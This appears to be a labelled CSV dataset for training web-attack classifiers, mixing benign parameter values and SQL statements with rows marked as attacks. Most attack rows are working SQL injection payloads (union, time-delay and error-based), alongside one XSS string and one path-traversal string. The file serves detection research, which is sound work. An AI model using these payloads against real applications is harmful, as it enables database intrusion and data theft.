payload,attack_type,is_attack,source
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'fbzo' like 'fbzo,sqli,1,HttpParamsDataset
"1')) as popm where 6594=6594 union all select null,null#",sqli,1,HttpParamsDataset
1827,norm,0,HttpParamsDataset
618,norm,0,HttpParamsDataset
hallenbe,norm,0,HttpParamsDataset
"1'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sqli,1,SQLiV3
DELETE FROM tomorrow,norm,0,SQLiV3
"1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli,1,SQLiV3
SELECT * FROM entire FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM finish,norm,0,SQLiV3
SELECT * FROM nearer WHERE may = 'pleasant'  AND City = 'told',norm,0,SQLiV3
minas de riotinto,norm,0,HttpParamsDataset
"1%'))) union all select null,null#",sqli,1,HttpParamsDataset
"-3377"") or 4982=6608#",sqli,1,HttpParamsDataset
"1"" where 6179=6179;begin user_lock.sleep(5); end--",sqli,1,HttpParamsDataset
SELECT MIN ( parallel )  AS happily FROM roof,norm,0,SQLiV3
SELECT AVG ( alone ) FROM sea,norm,0,SQLiV3
cargu9,norm,0,HttpParamsDataset
kinderman,norm,0,HttpParamsDataset
"1  )   as agex where 8167  =  8167 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",sqli,1,SQLiV3
8871403311691449,norm,0,HttpParamsDataset
"1%' union all select null,null,null,null,null,null,null--",sqli,1,HttpParamsDataset
"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",sqli,1,SQLiV3
DELETE FROM deal WHERE behavior = 'white',norm,0,SQLiV3
SELECT * FROM instant WHERE forgotten LIKE '%third%',norm,0,SQLiV3
"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",sqli,1,SQLiV3
tarasova_dabo@comerciosdeaspe.ly,norm,0,HttpParamsDataset
1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'ohqs' like 'ohqs,sqli,1,SQLiV3
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""soyg""=""soyg",sqli,1,HttpParamsDataset
 or true--,sqli,1,SQLiV3
59,norm,0,HttpParamsDataset
sagers,norm,0,HttpParamsDataset
4750834665833814,norm,0,HttpParamsDataset
"1"" where 9889  =  9889",sqli,1,SQLiV3
"1))) and elt(1210=1210,sleep(5)) and (((2341=2341",sqli,1,HttpParamsDataset
"-7007) union all select 6704,6704--",sqli,1,HttpParamsDataset
-5820')) as lkik where 4044=4044 or 7156=9197--,sqli,1,HttpParamsDataset
"-5731"" union all select 3083,3083,3083#",sqli,1,HttpParamsDataset
48550,norm,0,HttpParamsDataset
1') rlike (select (case when (9308=2540) then 1 else 0x28 end)) and ('rghd'='rghd,sqli,1,HttpParamsDataset
"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",sqli,1,HttpParamsDataset
"   SELECT COUNT ( famous ) , sentence FROM explain BY shallow",norm,0,SQLiV3
"-9558"" where 7497  =  7497 or   (  2539  =  6484  )  *6484--",sqli,1,SQLiV3
tiege.comptom@informatica2009.cv,norm,0,HttpParamsDataset
llobet viader,norm,0,HttpParamsDataset
"  SELECT fallenID AS ID, certain AS stay FROM supply",norm,0,SQLiV3
"SELECT MONTH ( ""2017-06-15 09:34:21"" ) ;",norm,0,SQLiV3
"1""   )    )    as jsdc where 2748  =  2748",sqli,1,SQLiV3
"1'+(select 'ejox' where 2719=2719 union all select null,null,null#",sqli,1,HttpParamsDataset
plaza asociacion de la prensa 107,norm,0,HttpParamsDataset
1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  3530  =  3530,sqli,1,SQLiV3
SELECT four ( s )  FROM accurate UNION,norm,0,SQLiV3
"1%""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""%""=""",sqli,1,HttpParamsDataset
"  SELECT moreID AS ID, studied AS social FROM movement",norm,0,SQLiV3
cado,norm,0,HttpParamsDataset
"  SELECT Orders.letterrID, Employees.silence, Employees.dinner FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.everyID ORDER BY Orders.trackID",norm,0,SQLiV3
"circon, 84, 13-e",norm,0,HttpParamsDataset
"INSERT INTO actually  ( sides, year, recognize )  VALUES  ( 'gravity', 'use', 'thumb' )  ",norm,0,SQLiV3
" SELECT column_name ( s )  FROM operation,private",norm,0,SQLiV3
DELETE FROM camp,norm,0,SQLiV3
SELECT * FROM one  WHERE threw = step,norm,0,SQLiV3
"1',iif(9496=4153,1,1/0)",sqli,1,HttpParamsDataset
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 24 )  ORDER BY meta_id ASC",norm,0,SQLiV3
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28557 )  ORDER BY meta_id ASC",norm,0,SQLiV3
45190,norm,0,HttpParamsDataset
"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""rurz""  =  ""rurz",sqli,1,SQLiV3
-9331' or (4519=2912)*2912 and 'rddk'='rddk,sqli,1,HttpParamsDataset
SELECT * FROM mass WHERE NOT little = 'harder'  AND NOT share = 'automobile',norm,0,SQLiV3
urrutia delems,norm,0,HttpParamsDataset
48552,norm,0,HttpParamsDataset
"-2803'  )   as jciy where 1130  =  1130 or make_set  (  4599  =  6550,6550  )  --",sqli,1,SQLiV3
select * from users where id  =  1 <@. or 1  =  1 -- 1,sqli,1,SQLiV3
1  )   as zzip where 5353  =  5353 and 3394  =  3092,sqli,1,SQLiV3
9481894123052720,norm,0,HttpParamsDataset
"calle virgen de covadonga, 32",norm,0,HttpParamsDataset
"-2102' where 3644=3644 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,HttpParamsDataset
5818,norm,0,HttpParamsDataset
SELECT around ( s FROM former RIGHT JOIN,norm,0,SQLiV3
mcgowan,norm,0,HttpParamsDataset
"-2377%'   )    )     )   union all select 7706,7706--",sqli,1,SQLiV3
valverde de burguillos,norm,0,HttpParamsDataset
"1%""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""%""  =  """,sqli,1,SQLiV3
7062474051769610,norm,0,HttpParamsDataset
"1'+(select 'vbqo' where 5630=5630 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,HttpParamsDataset
hemisfero,norm,0,HttpParamsDataset
SELECT Count ( * )  AS reach,norm,0,SQLiV3
"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli,1,SQLiV3
SELECT team ( s FROM though RIGHT JOIN,norm,0,SQLiV3
SELECT COUNT ( DISTINCT dried )  FROM put,norm,0,SQLiV3
virgen,norm,0,HttpParamsDataset
"1""   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli,1,SQLiV3
nicastro,norm,0,HttpParamsDataset
SELECT * FROM composed WHERE machine IN  ( SELECT thou FROM beautiful ) ,norm,0,SQLiV3
50371,norm,0,HttpParamsDataset
"1 where 7362=7362 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,HttpParamsDataset
"1"" or (select * from (select(sleep(5)))ydpu) and ""uvoq"" like ""uvoq",sqli,1,HttpParamsDataset
fady,norm,0,HttpParamsDataset
$embrutecimiento,norm,0,HttpParamsDataset
"1%"";select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,HttpParamsDataset
"1 where 3478  =  3478   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",sqli,1,SQLiV3
cortland@tobarisch.bs,norm,0,HttpParamsDataset
"-2912"") as eizh where 2223=2223 or make_set(1041=3056,3056)--",sqli,1,HttpParamsDataset
"1') as qaec where 6572=6572 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,HttpParamsDataset
ingelber,norm,0,HttpParamsDataset
5659,norm,0,SQLiV3
SELECT * FROM fix  WHERE noon NOT LIKE '[cent]%',norm,0,SQLiV3
1  )   as afmb where 8665  =  8665 order by 1#,sqli,1,SQLiV3
jimnez algora,norm,0,HttpParamsDataset
SELECT * FROM in FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM women,norm,0,SQLiV3
s9st6o,norm,0,HttpParamsDataset
"   SELECT COUNT ( motor ) , brick FROM press BY outline",norm,0,SQLiV3
SELECT TOP 3 * FROM power WHERE answer = 'be' SELECT * FROM tube,norm,0,SQLiV3
"-9032)) union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",sqli,1,HttpParamsDataset
-2210' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and 'myvr' like 'myvr,sqli,1,HttpParamsDataset
winstanley@waterflyesp.hn,norm,0,HttpParamsDataset
8936,norm,0,HttpParamsDataset
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",sqli,1,SQLiV3
"1"" union all select null,null,null#",sqli,1,HttpParamsDataset
"1 where 8506=8506;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,HttpParamsDataset
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  5432  =  5432",sqli,1,SQLiV3
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('vpus'='vpus",sqli,1,HttpParamsDataset
dev,norm,0,HttpParamsDataset
gonzalvo gorriti,norm,0,HttpParamsDataset
2461,norm,0,HttpParamsDataset
4803870000000000,norm,0,SQLiV3
"1%')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,HttpParamsDataset
SELECT * FROM amount WHERE but = 'greater' FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
lu,norm,0,HttpParamsDataset
s!u2cep7ivo,norm,0,HttpParamsDataset
5858,norm,0,HttpParamsDataset
5408,norm,0,HttpParamsDataset
1'||  (  select 'cgup' from dual where 5383  =  5383 waitfor delay '0:0:5'--,sqli,1,SQLiV3
latella,norm,0,HttpParamsDataset
6687072478385848,norm,0,HttpParamsDataset
83817692b,norm,0,HttpParamsDataset
5287631327187373,norm,0,HttpParamsDataset
"escultor bauls, 96,",norm,0,HttpParamsDataset
"  SELECT was AS family, visitor AS [seen]  FROM against",norm,0,SQLiV3
santa cruz de la salceda,norm,0,HttpParamsDataset
3581922362739971,norm,0,HttpParamsDataset
"-4984%""))) union all select 6980,6980,6980,6980,6980,6980,6980,6980#",sqli,1,HttpParamsDataset
-2751 where 6334  =  6334 or   (  9668  =  5845  )  *5845--,sqli,1,SQLiV3
92,norm,0,HttpParamsDataset
"1"" where 6501  =  6501",sqli,1,SQLiV3
anbal,norm,0,HttpParamsDataset
"-4373%""   )    )    or 5672  =  5188--",sqli,1,SQLiV3
salgado pladellorens,norm,0,HttpParamsDataset
"INSERT INTO fact ( difficult, wherever, movie, page, twice, mistake )  VALUES  ( 'collect', 'park'. room', 'army', 'grow', 'shall', 'board' )  ",norm,0,SQLiV3
if  (  8995  =  9787  )   select 8995 else drop function ofgg--,sqli,1,SQLiV3
08250,norm,0,HttpParamsDataset
"1"" where 9461  =  9461",sqli,1,SQLiV3
SELECT * FROM stop WHERE to = 'congress' FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
"1' where 6721=6721 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,HttpParamsDataset
SELECT * FROM unless WHERE    NOT fine = 'comfortable',norm,0,SQLiV3
" select * from users where id  =  1 or $+<\ union select 1,@@VERSION -- 1",sqli,1,SQLiV3
8159487475137064,norm,0,HttpParamsDataset
terradas provasi,norm,0,HttpParamsDataset
1')) as kahn where 1361=1361 or (select * from (select(sleep(5)))sddo)#,sqli,1,HttpParamsDataset
wayca,norm,0,HttpParamsDataset
1   )    )    as trin where 8843  =  8843,sqli,1,SQLiV3
60511130q,norm,0,HttpParamsDataset
-8095') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),sqli,1,HttpParamsDataset
-5299 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli,1,HttpParamsDataset
"1""   )    )    as gvpm where 5170  =  5170 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli,1,SQLiV3
SELECT AVG ( favorite ) FROM softly,norm,0,SQLiV3
catalineta,norm,0,HttpParamsDataset
38757754v,norm,0,HttpParamsDataset
29142280s,norm,0,HttpParamsDataset
FROM  ( SELECT DISTINCT map FROM run ) ,norm,0,SQLiV3
"1)) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((8554=8554",sqli,1,HttpParamsDataset
SELECT * FROM sick FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
quicena,norm,0,HttpParamsDataset
mannoers@magichobby.se,norm,0,HttpParamsDataset
"1"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""umst""=""umst",sqli,1,HttpParamsDataset
"-1830"")) as bptv where 4805=4805 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli,1,HttpParamsDataset
1';select (case when (1093=7693) then 1093 else 1/(select 0) end)--,sqli,1,HttpParamsDataset
gutierrez@sutelefono.cx,norm,0,HttpParamsDataset
SELECT * FROM individual WHERE situation NOT LIKE 'ship%',norm,0,SQLiV3
"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",sqli,1,SQLiV3
9820me5a,norm,0,HttpParamsDataset
0659755476152636,norm,0,HttpParamsDataset
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   '%'  =  '",sqli,1,SQLiV3
"<div style=""background-image: url(javascript:document.cookie=true;)"">",xss,1,HttpParamsDataset
"1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  '",sqli,1,SQLiV3
amelie,norm,0,HttpParamsDataset
oskar,norm,0,HttpParamsDataset
veracruz,norm,0,HttpParamsDataset
"1%""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sqli,1,SQLiV3
"1%')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('%'='",sqli,1,HttpParamsDataset
66381379k,norm,0,HttpParamsDataset
55964057c,norm,0,HttpParamsDataset
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_name IN  ( 'home-page-template' )  AND  (  0  =  1  )  AND wp_posts.post_type  =  'wp_template' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC,norm,0,SQLiV3
"rio ter, 86, 5?g",norm,0,HttpParamsDataset
"-4015"" where 2610=2610 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,HttpParamsDataset
"1'||(select 'bmyt' from dual where 9407=9407 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",sqli,1,HttpParamsDataset
"-5581%'))) union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",sqli,1,HttpParamsDataset
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_6102e48f912f6' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",norm,0,SQLiV3
"calle manzanilla 141,",norm,0,HttpParamsDataset
"1'+(select bruk where 1400=1400 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))+'",sqli,1,HttpParamsDataset
SELECT * FROM actually FETCH FIRST 50 PERCENT ROWS ONLY,norm,0,SQLiV3
"SELECT DATE_SUB ( ""2017-06-15"", INTERVAL -2 MONTH ) ;",norm,0,SQLiV3
1'   )    )    as egsj where 3447  =  3447,sqli,1,SQLiV3
60516960g,norm,0,HttpParamsDataset
SELECT * FROM alive WHERE Price NOT BETWEEN 10 AND 20,norm,0,SQLiV3
neugebauer@buscamoto.gw,norm,0,HttpParamsDataset
vingelli9@custombikesclothes.fr,norm,0,HttpParamsDataset
1) where 6039=6039 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,HttpParamsDataset
"grupo fuensanta 197, 12?a",norm,0,HttpParamsDataset
SELECT * FROM fur WHERE habit BETWEEN 'grown' AND 'reason',norm,0,SQLiV3
-7552 or 6872  =  6872,sqli,1,SQLiV3
pred6.finir,norm,0,HttpParamsDataset
jauregui cortines,norm,0,HttpParamsDataset
inoportunamente,norm,0,HttpParamsDataset
"1)) as xzcl where 2332=2332;select benchmark(5000000,md5(0x714e4153))#",sqli,1,HttpParamsDataset
a79ga44,norm,0,HttpParamsDataset
43962447v,norm,0,HttpParamsDataset
bartowna@professionalhost.do,norm,0,HttpParamsDataset
SELECT medicine FROM fifth,norm,0,SQLiV3
SELECT * FROM degree WHERE troops NOT LIKE 'long%',norm,0,SQLiV3
" SELECT LOCATE ( ""a"", CustomerName )  FROM Customers;",norm,0,SQLiV3
cassius,norm,0,HttpParamsDataset
17179,norm,0,HttpParamsDataset
9289,norm,0,HttpParamsDataset
tamer,norm,0,HttpParamsDataset
1'   )    )    and   (  1427  =  5813  )  *5813 and    (    (   'estb' like 'estb,sqli,1,SQLiV3
54310177r,norm,0,HttpParamsDataset
SELECT * FROM bent ORDER BY length DESC,norm,0,SQLiV3
2308021987140157,norm,0,HttpParamsDataset
"camio adelfas, 148, 5?g",norm,0,HttpParamsDataset
"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'dpdz' like 'dpdz",sqli,1,SQLiV3
58725277k,norm,0,HttpParamsDataset
martell canasa,norm,0,HttpParamsDataset
"  SELECT TIMESTAMP ( ""2017-07-23"" ) ;",norm,0,SQLiV3
SELECT improve ( s )  FROM cave,norm,0,SQLiV3
"1'+(select syrz where 7699=7699 union all select null,null,null#",sqli,1,HttpParamsDataset
2300000000000000,norm,0,SQLiV3
8711760000000000,norm,0,SQLiV3
"admin"" or 1  =  1--",sqli,1,SQLiV3
ginard xabe,norm,0,HttpParamsDataset
"  SELECT equally,other FROM porch WHERE make = 'threw' UNION SELECT exclaimed, engine FROM gray",norm,0,SQLiV3
c/ francisco rodriguez 48,norm,0,HttpParamsDataset
rastrilladora,norm,0,HttpParamsDataset
woll@stockdefotos.bb,norm,0,HttpParamsDataset
6516910925369020,norm,0,HttpParamsDataset
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",sqli,1,SQLiV3
55540530s,norm,0,HttpParamsDataset
kowalska@carmensanmartin.uz,norm,0,HttpParamsDataset
heicy,norm,0,HttpParamsDataset
"c/ aira de villaescusa 199, 1f",norm,0,HttpParamsDataset
1'||(select 'nwve' where 7721=7721;begin user_lock.sleep(5); end--,sqli,1,HttpParamsDataset
1  )   and   (  3020  =  3020  )  *6703,sqli,1,SQLiV3
SELECT * FROM gulf WHERE salmon NOT BETWEEN 'town' AND 'curve',norm,0,SQLiV3
"SELECT term_id, meta_key, meta_value FROM wp_termmeta WHERE term_id IN  ( 2710,3175,3142,3021,3141,3139,2676,3086,3140,3088 )  ORDER BY meta_id ASC",norm,0,SQLiV3
45253141c,norm,0,HttpParamsDataset
"1'+  (  select nvht where 9118  =  9118 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",sqli,1,SQLiV3
nassiet.birkin@cienciapolicial.gl,norm,0,HttpParamsDataset
"1%'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('%'='",sqli,1,HttpParamsDataset
/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{file},path-traversal,1,HttpParamsDataset
beecher@mailboxrussia.gu,norm,0,HttpParamsDataset
calle regimineto del sol 48 10e,norm,0,HttpParamsDataset
ella,norm,0,HttpParamsDataset
SELECT * FROM bet WHERE NOT push = 'snow'  AND NOT near = 'could',norm,0,SQLiV3
